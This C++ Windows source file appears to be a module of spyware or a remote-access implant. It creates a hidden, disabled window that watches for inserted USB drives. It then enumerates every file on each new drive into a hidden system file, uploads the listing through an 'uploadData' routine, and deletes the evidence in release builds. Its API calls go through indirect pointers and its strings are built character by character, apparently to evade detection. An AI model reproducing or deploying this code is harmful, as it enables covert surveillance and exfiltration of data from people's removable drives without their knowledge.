
#include <windows.h>
#include <dbt.h>
#include "../api.h"
#include "../public.h"
#include "harddiskfile.h"
#include "../network/NetWorkdata.h"
#include "../StrHelper.h"







int __stdcall ListFilesInUSB(char cDiskName) {

	char szDiskName[4] = { 0 };
	szDiskName[0] = cDiskName;
	szDiskName[1] = ':';
	szDiskName[2] = '\\';

	int iRet = 0;

	char strFilePath[MAX_PATH] = { 0 };
	iRet = makeFullFileName(strFilePath, USB_DISK_FILE_FILENAME);
	HANDLE hfile = lpCreateFileA(strFilePath, GENERIC_WRITE | GENERIC_READ, 0, 0, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int counter = FindFilesInDir(szDiskName, 1, hfile);
	if (counter > 0)
	{
		int filesize = lpGetFileSize(hfile, 0);
		char* lpbuf = new char[filesize];
		DWORD dwcnt = 0;
		iRet = lpSetFilePointer(hfile, 0, 0, FILE_BEGIN);
		iRet = lpReadFile(hfile, lpbuf, filesize, &dwcnt, 0);

		iRet = uploadData(lpbuf, filesize, USBALLFILES, 0);
		delete[] lpbuf;
	}

	lpCloseHandle(hfile);

#ifdef NDEBUG
	lpDeleteFileA(USB_DISK_FILE_FILENAME);
#endif

	return TRUE;
}



char FirstDriveFromMask(ULONG unitmask)
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
		{
			break;
		}
		else {
			unitmask >>= 1;
			continue;
		}
	}

	return (i + 'A');
}


LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	switch (wParam)
	{
	case DBT_DEVICEARRIVAL:

		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME/* || lpdb->dbch_devicetype == DBT_DEVINSTSTARTED*/)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			char udisk = FirstDriveFromMask(lpdbv->dbcv_unitmask);

			lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)ListFilesInUSB, (LPVOID)udisk, 0, 0));
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE:
		break;
	}
	return LRESULT();
}


LRESULT CALLBACK usbWndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_DEVICECHANGE: {
		OnDeviceChange(hwnd, wParam, lParam);
		return 0;
	}
	case WM_QUIT: {
		PostQuitMessage(0);
		return 0;
	}
	}
	return lpDefWindowProcA(hwnd, message, wParam, lParam);
}




int WINAPI CreateUsbWatcherWindow()
{
	CHAR szWindowClassName[] = { 'u','s','b','w','a','t','c','h','e','r',0 };
	WNDCLASSEXA        wndclassex = { 0 };
	wndclassex.cbSize = sizeof(WNDCLASSEXA);
	wndclassex.style = 0;
	wndclassex.lpfnWndProc = usbWndProc;
	wndclassex.cbClsExtra = 0;
	wndclassex.cbWndExtra = 0;
	wndclassex.hInstance = 0;
	wndclassex.hIcon = 0;
	wndclassex.hCursor = 0;
	wndclassex.hbrBackground = 0;
	wndclassex.lpszMenuName = 0;
	wndclassex.lpszClassName = szWindowClassName;

	int ret = ret = lpRegisterClassExA(&wndclassex);
	if (ret == FALSE)
	{
		return FALSE;
	}

	HWND hwnd = lpCreateWindowExA(WS_EX_OVERLAPPEDWINDOW, szWindowClassName, 0, WS_DISABLED, 0, 0, 0, 0, NULL, NULL, 0, NULL);
	if (hwnd == FALSE) {
		return FALSE;
	}

	MSG msg = { 0 };
	while (lpGetMessageA(&msg, NULL, 0, 0))
	{
		ret = lpTranslateMessage(&msg);
		ret = lpDispatchMessageA(&msg);
	}

	ret = UnregisterClassA(szWindowClassName, 0);
	return msg.wParam;
}




int __stdcall UsbFileWatcher() {
	int ret = CreateUsbWatcherWindow();
	return ret;
}